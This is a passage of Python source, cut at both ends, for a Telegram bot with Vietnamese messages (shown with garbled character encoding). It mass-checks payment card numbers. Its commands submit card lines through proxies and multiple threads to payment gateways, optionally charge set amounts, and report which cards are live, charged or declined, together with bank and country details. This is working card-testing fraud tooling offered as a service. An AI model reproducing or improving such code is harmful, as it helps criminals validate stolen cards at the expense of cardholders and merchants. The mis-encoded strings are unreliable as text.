                             f"**üè¶ C·ªïng:** `{gate_name}`\n"
                             f"**‚è±Ô∏è Th·ªùi gian:** `{duration:.2f}s`\n\n"
                             f"üë§ *Checker b·ªüi: {ADMIN_USERNAME}*")
            await msg.edit_text(final_message)
            return

        is_vn_decline = status == 'decline' and full_response == 'VIETNAM_BIN_DECLINE'
        is_invalid_bin_decline = status == 'decline' and full_response == 'INVALID_BIN_DECLINE'
        is_expired_card_decline = status == 'decline' and full_response == 'EXPIRED_CARD_DECLINE'
        is_invalid_cardnumber_decline = status == 'decline' and full_response == 'INVALID_CARDNUMBER_DECLINE'
        is_card_not_allowed_decline = status == 'decline' and full_response == 'CARD_NOT_ALLOWED_DECLINE'

        if is_invalid_bin_decline:
            final_message = (f"**üí† K·∫æT QU·∫¢ KI·ªÇM TRA TH·∫∫ üí†**\n\n"
                             f"**üí≥ Th·∫ª:** `{original_line}`\n"
                             f"**üö¶ Tr·∫°ng th√°i: ‚ùå T·ª™ CH·ªêI**\n"
                             f"**üí¨ Ph·∫£n h·ªìi:** `S·ªë th·∫ª kh√¥ng h·ª£p l·ªá (Kh√¥ng t√¨m th·∫•y BIN)`\n\n"
                             f"**üè¶ C·ªïng:** `BIN Check`\n\n"
                             f"**‚è±Ô∏è Th·ªùi gian:** `{duration:.2f}s`\n\n"
                             f"üë§ *Checker b·ªüi: {ADMIN_USERNAME}*")
        elif is_invalid_cardnumber_decline:
            final_message = (f"**üí† K·∫æT QU·∫¢ KI·ªÇM TRA TH·∫∫ üí†**\n\n"
                             f"**üí≥ Th·∫ª:** `{original_line}`\n"
                             f"**üö¶ Tr·∫°ng th√°i: ‚ùå T·ª™ CH·ªêI**\n"
                             f"**üí¨ Ph·∫£n h·ªìi:** `S·ªë th·∫ª kh√¥ng h·ª£p l·ªá`\n\n"
                             f"**üè¶ C·ªïng:** `Datatrans Tokenize`\n\n"
                             f"**‚è±Ô∏è Th·ªùi gian:** `{duration:.2f}s`\n\n"
                             f"üë§ *Checker b·ªüi: {ADMIN_USERNAME}*")
        elif is_card_not_allowed_decline:
            final_message = (f"**üí† K·∫æT QU·∫¢ KI·ªÇM TRA TH·∫∫ üí†**\n\n"
                             f"**üí≥ Th·∫ª:** `{original_line}`\n"
                             f"**üö¶ Tr·∫°ng th√°i: ‚ùå T·ª™ CH·ªêI**\n"
                             f"**üí¨ Ph·∫£n h·ªìi:** `Th·∫ª kh√¥ng ƒë∆∞·ª£c h·ªó tr·ª£`\n\n"
                             f"**üè¶ C·ªïng:** `Datatrans Tokenize`\n\n"
                             f"**‚è±Ô∏è Th·ªùi gian:** `{duration:.2f}s`\n\n"
                             f"üë§ *Checker b·ªüi: {ADMIN_USERNAME}*")
        elif is_expired_card_decline:
            final_message = (f"**üí† K·∫æT QU·∫¢ KI·ªÇM TRA TH·∫∫ üí†**\n\n"
                             f"**üí≥ Th·∫ª:** `{original_line}`\n"
                             f"**üö¶ Tr·∫°ng th√°i: ‚ùå T·ª™ CH·ªêI**\n"
                             f"**üí¨ Ph·∫£n h·ªìi:** `Th·∫ª ƒë√£ h·∫øt h·∫°n`\n\n"
                             f"**üè¶ C·ªïng:** `Pre-Check`\n\n"
                             f"**‚è±Ô∏è Th·ªùi gian:** `{duration:.2f}s`\n\n"
                             f"üë§ *Checker b·ªüi: {ADMIN_USERNAME}*")
        elif is_vn_decline:
            final_message = (f"**üí† K·∫æT QU·∫¢ KI·ªÇM TRA TH·∫∫ üí†**\n\n"
                             f"**üí≥ Th·∫ª:** `{original_line}`\n"
                             f"**üö¶ Tr·∫°ng th√°i: ‚ùå T·ª™ CH·ªêI**\n"
                             f"**üí¨ Ph·∫£n h·ªìi:** `T·ª™ CH·ªêI (BIN Vi·ªát Nam)`\n\n"
                             f"**üè¶ C·ªïng:** `{gate_name}`\n\n"
                             f"**‚è±Ô∏è Th·ªùi gian:** `{duration:.2f}s`\n\n"
                             f"üë§ *Checker b·ªüi: {ADMIN_USERNAME}*")
        
        else:
            status_text = ""
            response_message = ""
            
            status_map = {
                'custom': ("üîí 3D SECURE", full_response),
                'invalid_format': ("üìã L·ªñI ƒê·ªäNH D·∫†NG", full_response),
                'error': ("‚ùóÔ∏è L·ªñI", full_response),
                'unknown': ("‚ùî KH√îNG X√ÅC ƒê·ªäNH", full_response),
            }

            if status == 'live_success':
                status_text = "‚úÖ ƒê∆∞·ª£c ch·∫•p thu·∫≠n"
                response_message = "Th·∫ª ƒë√£ ƒë∆∞·ª£c th√™m th√†nh c√¥ng üí≥"
            elif status == 'decline':
                status_text = "‚ùå T·ª™ CH·ªêI"
                response_message = "Th·∫ª b·ªã t·ª´ ch·ªëi"
            elif status == 'success':
                try:
                    amount_charged_raw = int(full_response.split('_')[1])
                    amount_in_usd = amount_charged_raw / 100.0
                    status_text = f"‚úÖ ƒê√É CHARGE {amount_in_usd:.2f}$"
                    response_message = f"Giao d·ªãch th√†nh c√¥ng v·ªõi {amount_in_usd:.2f}$."
                except (ValueError, IndexError):
                    status_text = "‚úÖ ƒê√É CHARGE"
                    response_message = "Giao d·ªãch th√†nh c√¥ng!"
            else:
                status_text, response_message = status_map.get(status, status_map['unknown'])

            brand = (bin_info.get('brand') or 'N/A').upper()
            card_type = (bin_info.get('type') or 'N/A').upper()
            level = (bin_info.get('level') or 'N/A').upper()
            bank = bin_info.get('bank') or 'None'
            country_name = (bin_info.get('country_name') or 'N/A').upper()
            country_code = bin_info.get('country_code')
            flag = get_flag_emoji(country_code)
            
            bin_info_parts = [p for p in [brand, card_type, level] if p and p != 'N/A']
            bin_info_line = " ‚Äì ".join(bin_info_parts)

            bin_details_str = (
                f"üÜî **BIN:** {bin_info_line}\n"
                f"üèõÔ∏è **Ng√¢n h√†ng:** {bank}\n"
                f"üåê **Qu·ªëc gia:** {country_name} {flag}"
            )
            
            response_display_part = ""
            if is_charge_mode and status == 'custom':
                response_display_part = f"**üí¨ Ph·∫£n h·ªìi:** `Y√™u c·∫ßu 3D Secure`"
            elif status == 'unknown':
                if user.id == ADMIN_ID:
                    safe_response = str(response_message)[:1000]
                    response_display_part = f"**üí¨ Ph·∫£n h·ªìi:**\n```json\n{safe_response}\n```"
                else:
                    response_display_part = f"**üí¨ Ph·∫£n h·ªìi:** `Kh√¥ng x√°c ƒë·ªãnh`"
            elif status in ['custom', 'invalid_format', 'error']:
                safe_response = str(response_message)[:1000]
                response_display_part = f"**üí¨ Ph·∫£n h·ªìi:**\n```json\n{safe_response}\n```"
            else:
                response_display_part = f"**üí¨ Ph·∫£n h·ªìi:** `{response_message}`"


            final_message = (f"**üí† K·∫æT QU·∫¢ KI·ªÇM TRA TH·∫∫ üí†**\n\n"
                             f"**üí≥ Th·∫ª:** `{original_line}`\n"
                             f"**üö¶ Tr·∫°ng th√°i: {status_text}**\n"
                             f"{response_display_part}\n\n"
                             f"‚ÑπÔ∏è **Th√¥ng tin BIN:**\n{bin_details_str}\n\n"
                             f"**üè¶ C·ªïng:** `{gate_name}`\n\n"
                             f"**‚è±Ô∏è Th·ªùi gian:** `{duration:.2f}s`\n\n"
                             f"üë§ *Checker b·ªüi: {ADMIN_USERNAME}*")
        
        await msg.edit_text(final_message)
        
    except Exception as e:
        logger.error(f"Error in _process_single_check function: {e}", exc_info=True)
        safe_error_message = str(e).replace('`', "'")
        await msg.edit_text(f"‚õîÔ∏è **L·ªói H·ªá th·ªëng:**\n```\n{safe_error_message}\n```")

async def cs_command(update, context):
    user = update.effective_user
    
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"B·∫°n kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng l·ªánh n√†y. Vui l√≤ng li√™n h·ªá Admin: {ADMIN_USERNAME}")
        return
    if user.id != ADMIN_ID and not is_bot_on():
        await update.message.reply_text(MESSAGES["bot_off"])
        return

    if not context.args: await update.message.reply_text("S·ª≠ d·ª•ng: `/cs cc|mm|yy|cvv` ho·∫∑c `/cs cc|mm/yy|cvv`"); return
    
    line = " ".join(context.args)
    await _process_single_check(update, context, line)

async def cs_custom_amount_command(update, context):
    """Handler for the admin's /cs<amount> command."""
    user = update.effective_user
    
    if user.id != ADMIN_ID:
        return
        
    if not is_bot_on():
        await update.message.reply_text(MESSAGES["bot_off"])
        return

    match = re.match(r'/cs(\d+)', update.message.text, re.IGNORECASE)
    if not match: return
        
    try:
        custom_charge_amount = int(match.group(1))
    except (ValueError, IndexError):
        await update.message.reply_text("‚ùå S·ªë ti·ªÅn charge kh√¥ng h·ª£p l·ªá.")
        return

    card_info_str = update.message.text[len(match.group(0)):].strip()
    if not card_info_str:
        await update.message.reply_text(f"S·ª≠ d·ª•ng: `/cs{custom_charge_amount} cc|mm|yy|cvv`")
        return
        
    await _process_single_check(update, context, card_info_str, custom_charge_amount=custom_charge_amount)


async def multi_check_command(update, context):
    user = update.effective_user
    
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"B·∫°n kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng l·ªánh n√†y. Vui l√≤ng li√™n h·ªá Admin: {ADMIN_USERNAME}")
        return
        
    if user.id != ADMIN_ID and not is_bot_on():
        await update.message.reply_text(MESSAGES["bot_off"])
        return
        
    if user.id in ACTIVE_CHECKS:
        await update.message.reply_text("B·∫°n ƒë√£ c√≥ m·ªôt t√°c v·ª• ki·ªÉm tra kh√°c ƒëang ch·∫°y. Vui l√≤ng ƒë·ª£i n√≥ ho√†n th√†nh ho·∫∑c s·ª≠ d·ª•ng /stop.", quote=True)
        return

    text_content = update.message.text.split('/multi', 1)[-1].strip()
    if not text_content:
        await update.message.reply_text("S·ª≠ d·ª•ng: D√πng l·ªánh `/multi` sau ƒë√≥ d√°n danh s√°ch th·∫ª c·ªßa b·∫°n v√†o d√≤ng ti·∫øp theo."); return

    lines = [line.strip() for line in text_content.splitlines() if line.strip()]
    total_lines = len(lines)

    if total_lines == 0:
        await update.message.reply_text("Kh√¥ng c√≥ th·∫ª n√†o ƒë·ªÉ ki·ªÉm tra."); return

    if user.id != ADMIN_ID:
        user_limit = get_user_multi_limit(user.id)
        if total_lines > user_limit:
            await update.message.reply_text(
                f"‚õîÔ∏è **V∆∞·ª£t qu√° gi·ªõi h·∫°n!**\n\n"
                f"B·∫°n ƒë√£ g·ª≠i `{total_lines}` th·∫ª, nh∆∞ng gi·ªõi h·∫°n c·ªßa b·∫°n cho l·ªánh /multi l√† `{user_limit}` th·∫ª m·ªôt l·∫ßn.\n\n"
                f"ƒê·ªÉ tƒÉng gi·ªõi h·∫°n, vui l√≤ng li√™n h·ªá qu·∫£n tr·ªã vi√™n {ADMIN_USERNAME}."
            )
            return

    active_gate = get_active_gate()
    gate_name = get_formatted_gate_name(active_gate)
    
    keyboard = [[InlineKeyboardButton("üõë D·ª´ng t√°c v·ª•", callback_data=f"stop_mytask_{user.id}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    status_message = await update.message.reply_text(f"‚è≥ ƒêang kh·ªüi t·∫°o... Chu·∫©n b·ªã ki·ªÉm tra `{total_lines}` th·∫ª qua **{gate_name}**.", reply_markup=reply_markup)
    start_time = time.time()
    
    cancel_event = threading.Event()
    loop = asyncio.get_running_loop()
    try:
        ACTIVE_CHECKS[user.id] = {
            "full_name": user.full_name,
            "username": user.username,
            "start_time": time.time(),
            "task_type": "multi"
        }
        CANCELLATION_EVENTS[user.id] = cancel_event

        counts = {'success': 0, 'live_success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0, 'cancelled': 0, 'gate_dead': 0}
        results = {k: [] for k in counts.keys()}
        processed_count = 0
        last_update_time = time.time()
        num_threads = min(10, total_lines) 
        gate_died_flag = False
        stopped_due_to_http_error = False
        persistent_http_error_count = 0
        gate_fail_card = ""

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            future_to_line = {executor.submit(check_card_with_retry, line, cancel_event): line for line in lines}
            for future in as_completed(future_to_line):
                if cancel_event.is_set():
                    break

                processed_count += 1
                try:
                    status, original_line, full_response, bin_info, had_persistent_error = future.result()
                    
                    if user.id != ADMIN_ID and status in ['error', 'unknown']:
                        debug_info = f"üêû DEBUG ALERT (/multi from user {user.id}):\nCard: {original_line}\nResponse: {str(full_response)[:3500]}"
                        coro = context.bot.send_message(chat_id=ADMIN_ID, text=debug_info)
                        asyncio.run_coroutine_threadsafe(coro, loop)

                    if had_persistent_error:
                        persistent_http_error_count += 1
                        results['error'].append(f"‚ùóÔ∏è `{original_line}` | L·ªói HTTP li√™n t·ª•c: {full_response}")
                        proxy_config = load_proxies()
                        if proxy_config.get("enabled") and persistent_http_error_count > 10:
                            logger.error("Stopping /multi task due to too many persistent HTTP errors.")
                            stopped_due_to_http_error = True
                            cancel_event.set()
                        continue
                            
                    if status == 'gate_dead':
                        counts['gate_dead'] += 1
                        gate_fail_card = original_line
                        gate_died_flag = True
                        cancel_event.set()
                        continue

                    counts[status] = counts.get(status, 0) + 1
                    status_icons = {'success': '‚úÖ', 'live_success': '‚úÖ', 'decline': '‚ùå', 'custom': 'üîí', 'invalid_format': 'üìã', 'error': '‚ùóÔ∏è', 'unknown': '‚ùî', 'cancelled': 'üõë'}
                    
                    brand = (bin_info.get('brand') or 'N/A').upper()
                    card_type = (bin_info.get('type') or 'N/A').upper()
                    level = (bin_info.get('level') or 'N/A').upper()
                    bank = (bin_info.get('bank') or 'N/A')
                    country_name = (bin_info.get('country_name') or 'N/A').upper()

                    bin_parts = [p for p in [bank, brand, card_type, level, country_name] if p and p != 'N/A']
                    bin_str = " - ".join(bin_parts)

                    result_line = ""
                    if status == 'decline':
                        if full_response == 'VIETNAM_BIN_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `T·ª™ CH·ªêI (VN BIN)`"
                        elif full_response == 'INVALID_BIN_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `T·ª™ CH·ªêI (Invalid BIN)`"
                        elif full_response == 'EXPIRED_CARD_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `T·ª™ CH·ªêI (H·∫øt h·∫°n)`"
                        elif full_response == 'INVALID_CARDNUMBER_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `T·ª™ CH·ªêI (S·ªë th·∫ª kh√¥ng h·ª£p l·ªá)`"
                        elif full_response == 'CARD_NOT_ALLOWED_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `T·ª™ CH·ªêI (Kh√¥ng h·ªó tr·ª£)`"
                        else: result_line = f"{status_icons['decline']} `{original_line}`"
                    elif status == 'live_success':
                        result_line = f"{status_icons['live_success']} `{original_line}` | Approved | `{bin_str}`"
                    elif status == 'success':
                        try:
                            amount_charged_raw = int(full_response.split('_')[1])
                            amount_in_usd = amount_charged_raw / 100.0
                            charge_msg = f"| Charge {amount_in_usd:.2f}$ th√†nh c√¥ng"
                        except (ValueError, IndexError):
                            charge_msg = "| ƒê√£ charge th√†nh c√¥ng"
                        result_line = f"{status_icons['success']} `{original_line}` | `{bin_str}` {charge_msg}"
                    elif status == 'invalid_format': result_line = f"{status_icons[status]} `{original_line}` | L√Ω do: {str(full_response)[:50]}" 
                    elif status == 'cancelled': continue
                    elif status == 'error' and had_persistent_error:
                        continue
                    else:
                        if status == 'unknown':
                            result_line = f"{status_icons.get(status, '‚ùî')} `{original_line}` | Kh√¥ng x√°c ƒë·ªãnh"
                        else:
                            result_line = f"{status_icons.get(status, '‚ùî')} `{original_line}` | `{bin_str}`"

                    if result_line: results[status].append(result_line)

                except Exception as e:
                    original_line = future_to_line[future]
                    logger.error(f"Error processing future for card {original_line}: {e}", exc_info=True)
                    counts['error'] += 1
                    results['error'].append(f"‚ùóÔ∏è `{original_line}` | L·ªói x·ª≠ l√Ω: {e}")

                if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                    
                    cpu_usage = psutil.cpu_percent()
                    ram_usage = psutil.virtual_memory().percent

                    status_lines = [
                        f"**üöÄ ƒêang ti·∫øn h√†nh ki·ªÉm tra...**\n{progress_bar}\n",
                        f"üíª **CPU:** `{cpu_usage}%` | **RAM:** `{ram_usage}%`",
                        f"**C·ªïng:** `{gate_name}`",
                        f"**Ti·∫øn tr√¨nh:** `{processed_count}/{total_lines}`\n"
                    ]
                    
                    is_charge_mode = False
                    if active_gate == 'dalink' and get_multi_link_mode()['mode'] == 'charge':
                        is_charge_mode = True
                    elif active_gate in ['4', '6']:
                        is_charge_mode = True
                    elif active_gate in ['1', '2', '3', '5', '8', '9', '10', '11', '12'] and (
                        (active_gate == '1' and get_gate1_mode() == 'charge') or
                        (active_gate == '2' and get_gate2_mode() == 'charge') or
                        (active_gate == '3' and get_gate3_mode() == 'charge') or
                        (active_gate == '5' and get_gate5_mode() == 'charge') or
                        (active_gate == '8' and get_gate8_mode() == 'charge') or
                        (active_gate == '9' and get_gate9_mode() == 'charge') or
                        (active_gate == '10' and get_gate10_mode() == 'charge') or
                        (active_gate == '11' and get_gate11_mode() == 'charge') or
                        (active_gate == '12' and get_gate12_mode() == 'charge')
                    ):
                        is_charge_mode = True

                    if is_charge_mode:
                        status_lines.append(f"‚úÖ **ƒê√£ Charge:** `{counts['success']}`")
                    
                    status_lines.extend([
                        f"‚úÖ **ƒê∆∞·ª£c ch·∫•p thu·∫≠n:** `{counts['live_success']}`",
                        f"‚ùå **B·ªã t·ª´ ch·ªëi:** `{counts['decline']}`",
                        f"üîí **3D Secure:** `{counts['custom']}` | ‚ùî **L·ªói:** `{counts['error']}`"
                    ])
                    status_text = "\n".join(status_lines)

                    try:
                        current_reply_markup = reply_markup if not cancel_event.is_set() else None
                        await status_message.edit_text(text=status_text, reply_markup=current_reply_markup)
                    except telegram.error.BadRequest as e:
                        if "Message is not modified" not in str(e): logger.warning(f"Error updating /multi progress: {e}")
                        pass
                    except Exception as e:
                        logger.error(f"Unknown error updating /multi progress: {e}")
                    last_update_time = time.time()
                
        duration = time.time() - start_time
        update_user_stats(user.id, user, counts)

        if stopped_due_to_http_error:
            await status_message.edit_text(
                f"üõë **CHECK ƒê√É D·ª™NG - QU√Å NHI·ªÄU L·ªñI HTTP** üõë\n\n"
                f"**L√Ω do:** C√¥ng c·ª• ƒë√£ b·ªã d·ª´ng v√¨ h∆°n 10 th·∫ª kh√¥ng th√†nh c√¥ng v·ªõi l·ªói k·∫øt n·ªëi HTTP li√™n t·ª•c khi s·ª≠ d·ª•ng proxy.\n"
                f"ƒêi·ªÅu n√†y th∆∞·ªùng cho th·∫•y s·ª± c·ªë m·∫°ng ho·∫∑c s·ª± c·ªë v·ªõi c·ªïng thanh to√°n.\n\n"
                f"**ƒê√£ x·ª≠ l√Ω tr∆∞·ªõc khi d·ª´ng:** `{processed_count}/{total_lines}`",
                reply_markup=None
            )
            return

        if gate_died_flag:
            await status_message.edit_text(
                f"üõë **CHECK ƒê√É D·ª™NG - GATE DIE** üõë\n\n"
                f"**L√Ω do:** C·ªïng kh√¥ng ho·∫°t ƒë·ªông (l·ªói `Forbidden`).\n"
                f"Qu√° tr√¨nh ƒë√£ ƒë∆∞·ª£c d·ª´ng ngay l·∫≠p t·ª©c.\n\n"
                f"**C·ªïng ƒë√£ s·ª≠ d·ª•ng:** `{gate_name}`\n"
                f"**Th·∫ª g√¢y l·ªói:** `{gate_fail_card}`\n\n"
                f"**ƒê√£ x·ª≠ l√Ω tr∆∞·ªõc khi d·ª´ng:** `{processed_count}/{total_lines}`",
                reply_markup=None
            )
            return

        if cancel_event.is_set():
            await status_message.edit_text(f"üõë **T√°c v·ª• ƒë√£ ƒë∆∞·ª£c d·ª´ng theo y√™u c·∫ßu.**\n\nƒê√£ x·ª≠ l√Ω: {processed_count}/{total_lines} th·∫ª.", reply_markup=None)
            return

        final_header = [
            f"**üìä Ki·ªÉm tra ho√†n t·∫•t!**\n",
            f"**C·ªïng ƒë√£ s·ª≠ d·ª•ng:** `{gate_name}`",
            f"**T·ªïng s·ªë th·∫ª:** `{total_lines}`",
            f"**Th·ªùi gian th·ª±c hi·ªán:** `{duration:.2f}s`\n",
        ]

        final_counts = []
        is_charge_mode = False
        if active_gate == 'dalink' and get_multi_link_mode()['mode'] == 'charge':
            is_charge_mode = True
        elif active_gate in ['4', '6']:
            is_charge_mode = True
        elif active_gate in ['1', '2', '3', '5', '8', '9', '10', '11', '12'] and (
            (active_gate == '1' and get_gate1_mode() == 'charge') or
            (active_gate == '2' and get_gate2_mode() == 'charge') or
            (active_gate == '3' and get_gate3_mode() == 'charge') or
            (active_gate == '5' and get_gate5_mode() == 'charge') or
            (active_gate == '8' and get_gate8_mode() == 'charge') or
            (active_gate == '9' and get_gate9_mode() == 'charge') or
            (active_gate == '10' and get_gate10_mode() == 'charge') or
            (active_gate == '11' and get_gate11_mode() == 'charge') or
            (active_gate == '12' and get_gate12_mode() == 'charge')
        ):
            is_charge_mode = True
            
        if is_charge_mode:
            final_counts.append(f"‚úÖ **ƒê√£ Charge:** `{counts['success']}`")
        
        final_counts.extend([
            f"‚úÖ **ƒê∆∞·ª£c ch·∫•p thu·∫≠n:** `{counts['live_success']}`",
            f"‚ùå **B·ªã t·ª´ ch·ªëi:** `{counts['decline']}`",
            f"üîí **3D Secure:** `{counts['custom']}`",
            f"üìã **ƒê·ªãnh d·∫°ng kh√¥ng h·ª£p l·ªá:** `{counts['invalid_format']}`",
            f"‚ùóÔ∏è **L·ªói:** `{counts['error']}`\n",
            f"-----------------------------------------"
        ])

        final_message = final_header + final_counts
        
        if results['live_success']: final_message.extend(("\n**‚úÖ ƒê∆Ø·ª¢C CH·∫§P THU·∫¨N:**", *results['live_success']))
        if results['success'] and is_charge_mode: final_message.extend(("\n**‚úÖ TH·∫∫ ƒê√É CHARGE:**", *results['success']))
        if results['custom']: final_message.extend(("\n**üîí TH·∫∫ 3D SECURE:**", *results['custom']))
        if results['decline']: final_message.extend(("\n**‚ùå TH·∫∫ B·ªä T·ª™ CH·ªêI:**", *results['decline']))
        if results['invalid_format']: final_message.extend(("\n**üìã ƒê·ªäNH D·∫†NG KH√îNG H·ª¢P L·ªÜ:**", *results['invalid_format']))
        if results['error']: final_message.extend(("\n**‚ùóÔ∏è L·ªñI:**", *results['error']))
        if results['unknown']: final_message.extend(("\n**‚ùî KH√îNG X√ÅC ƒê·ªäNH:**", *results['unknown']))

        final_text = "\n".join(final_message)
        
        if len(final_text) > 4096:
            await status_message.edit_text("K·∫øt qu·∫£ qu√° d√†i ƒë·ªÉ hi·ªÉn th·ªã. ƒêang g·ª≠i d∆∞·ªõi d·∫°ng t·ªáp.", reply_markup=None)
            with io.BytesIO(final_text.encode('utf-8')) as file_to_send:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=file_to_send, filename="multi_check_results.txt")
        else:
            await status_message.edit_text(final_text, reply_markup=None)

    except Exception as e:
        logger.error(f"Error in /multi: {e}", exc_info=True)
        await status_message.edit_text(f"‚õîÔ∏è **L·ªói nghi√™m tr·ªçng!**\n```\n{str(e).replace('`', '')}\n```", reply_markup=None)
    finally:
        ACTIVE_CHECKS.pop(user.id, None)
        CANCELLATION_EVENTS.pop(user.id, None)

async def mass_check_handler(update, context):
    user = update.effective_user
    
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"B·∫°n kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng l·ªánh n√†y. Vui l√≤ng li√™n h·ªá Admin: {ADMIN_USERNAME}")
        return
        
    if user.id != ADMIN_ID and not is_bot_on():
        await update.message.reply_text(MESSAGES["bot_off"])
        return
    
    if user.id in ACTIVE_CHECKS:
        logger.warning(f"User {user.id} ({user.full_name}) tried to spam /mass.")
        await update.message.reply_text("B·∫°n ƒë√£ c√≥ m·ªôt t√°c v·ª• ki·ªÉm tra kh√°c ƒëang ch·∫°y. Vui l√≤ng ƒë·ª£i n√≥ ho√†n th√†nh ho·∫∑c s·ª≠ d·ª•ng /stop.", quote=True)
        return 

    if not update.message.document: await update.message.reply_text("Vui l√≤ng ƒë√≠nh k√®m t·ªáp .txt."); return
    document = update.message.document
    if not document.file_name.lower().endswith('.txt'): await update.message.reply_text("Ch·ªâ ch·∫•p nh·∫≠n t·ªáp .txt."); return
    
    file = await context.bot.get_file(document.file_id)
    file_content = (await file.download_as_bytearray()).decode('utf-8')
    lines = [line for line in file_content.splitlines() if line.strip()]
    total_lines = len(lines)

    if not lines: await update.message.reply_text("üìÇ T·ªáp tr·ªëng."); return
    
    if user.id != ADMIN_ID:
        user_limit = get_user_limit(user.id)
        if total_lines > user_limit:
            await update.message.reply_text(
                f"‚õîÔ∏è **V∆∞·ª£t qu√° gi·ªõi h·∫°n!**\n\n"
                f"T·ªáp c·ªßa b·∫°n c√≥ `{total_lines}` d√≤ng, nh∆∞ng gi·ªõi h·∫°n c·ªßa b·∫°n l√† `{user_limit}` d√≤ng.\n\n"
                f"Vui l√≤ng li√™n h·ªá qu·∫£n tr·ªã vi√™n {ADMIN_USERNAME} ƒë·ªÉ tƒÉng gi·ªõi h·∫°n c·ªßa b·∫°n."
            )
            return

    caption = update.message.caption or "/mass"
    
    requested_threads_match = re.match(r'/mass(\d+)', caption)
    requested_threads = int(requested_threads_match.group(1)) if requested_threads_match and requested_threads_match.group(1) else 10

    if user.id != ADMIN_ID:
        num_threads = min(requested_threads, MEMBER_THREAD_LIMIT)
        if requested_threads > MEMBER_THREAD_LIMIT:
            await update.message.reply_text(
                f"‚ö†Ô∏è **Gi·ªõi h·∫°n lu·ªìng!** Th√†nh vi√™n c√≥ th·ªÉ s·ª≠ d·ª•ng t·ªëi ƒëa {MEMBER_THREAD_LIMIT} lu·ªìng. ƒê√£ t·ª± ƒë·ªông ƒëi·ªÅu ch·ªânh.",
                quote=True
            )
    else:
        num_threads = requested_threads

    num_threads = max(1, num_threads)

    active_gate = get_active_gate()
    gate_name = get_formatted_gate_name(active_gate)

    session_timestamp = datetime.now(VIETNAM_TZ).strftime("%Y%m%d-%H%M%S")
    session_dir = os.path.join(LOG_DIR, str(user.id), session_timestamp)
    os.makedirs(session_dir, exist_ok=True)
    
    keyboard = [[InlineKeyboardButton("üõë D·ª´ng t√°c v·ª•", callback_data=f"stop_mytask_{user.id}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    status_message = await update.message.reply_text(f"‚è≥ ƒêang kh·ªüi t·∫°o... Chu·∫©n b·ªã ki·ªÉm tra `{total_lines}` th·∫ª v·ªõi `{num_threads}` lu·ªìng qua **{gate_name}**.", reply_markup=reply_markup)
    start_time = time.time()
    
    cancel_event = threading.Event()
    loop = asyncio.get_running_loop()
    try:
        ACTIVE_CHECKS[user.id] = {
            "full_name": user.full_name,
            "username": user.username,
            "start_time": time.time(),
            "task_type": "mass"
        }
        CANCELLATION_EVENTS[user.id] = cancel_event

        counts = {'success': 0, 'live_success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0, 'cancelled': 0, 'gate_dead': 0}
        result_lists = {k: [] for k in counts.keys()}
        result_lists['error_debug'] = []
        processed_count = 0
        last_update_time = time.time()
        gate_died_flag = False
        stopped_due_to_http_error = False
        persistent_http_error_count = 0
        gate_fail_card = ""

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            future_to_line = {executor.submit(check_card_with_retry, line, cancel_event): line for line in lines}
            for future in as_completed(future_to_line):
                if cancel_event.is_set():
                    break

                processed_count += 1
                try:
                    status, original_line, full_response, bin_info, had_persistent_error = future.result()
                    
                    if status in ['error', 'unknown']:
                        debug_info = f"Card: {original_line}\nResponse: {str(full_response)[:3500]}"
                        result_lists['error_debug'].append(debug_info)
                        if user.id != ADMIN_ID:
                            coro = context.bot.send_message(chat_id=ADMIN_ID, text=f"üêû DEBUG ALERT (user {user.id}):\n{debug_info}")
                            asyncio.run_coroutine_threadsafe(coro, loop)
                
                    if had_persistent_error:
                        persistent_http_error_count += 1
                        result_lists['error'].append(f"{original_line} | L·ªói HTTP li√™n t·ª•c: {full_response}")
                        proxy_config = load_proxies()
                        if proxy_config.get("enabled") and persistent_http_error_count > 10:
                            logger.error("Stopping /mass task due to too many persistent HTTP errors.")
                            stopped_due_to_http_error = True
                            cancel_event.set()
                        continue

                    if status == 'gate_dead':
                        counts['gate_dead'] += 1
                        gate_fail_card = original_line
                        gate_died_flag = True
                        cancel_event.set()
                        result_lists['error'].append(f"{original_line} | GATE DIE (Forbidden)")
                        continue
                    
                    counts[status] = counts.get(status, 0) + 1
                    
                    brand = (bin_info.get('brand') or 'N/A').upper()
                    card_type = (bin_info.get('type') or 'N/A').upper()
                    level = (bin_info.get('level') or 'N/A').upper()
                    bank = (bin_info.get('bank') or 'N/A')
                    country_name = (bin_info.get('country_name') or 'N/A').upper()

                    bin_parts = [p for p in [bank, brand, card_type, level, country_name] if p and p != 'N/A']
                    bin_str_details = " - ".join(bin_parts)

                    line_to_save = ""
                    if status == 'decline':
                        if full_response == 'VIETNAM_BIN_DECLINE': line_to_save = f"{original_line} | T·ª™ CH·ªêI (VN BIN)"
                        elif full_response == 'INVALID_BIN_DECLINE': line_to_save = f"{original_line} | T·ª™ CH·ªêI (Invalid BIN)"
                        elif full_response == 'EXPIRED_CARD_DECLINE': line_to_save = f"{original_line} | T·ª™ CH·ªêI (H·∫øt h·∫°n)"
                        elif full_response == 'INVALID_CARDNUMBER_DECLINE': line_to_save = f"{original_line} | T·ª™ CH·ªêI (S·ªë th·∫ª kh√¥ng h·ª£p l·ªá)"
                        elif full_response == 'CARD_NOT_ALLOWED_DECLINE': line_to_save = f"{original_line} | T·ª™ CH·ªêI (Kh√¥ng h·ªó tr·ª£)"
                        else: line_to_save = f"{original_line} | T·ª™ CH·ªêI"
                    elif status == 'live_success':
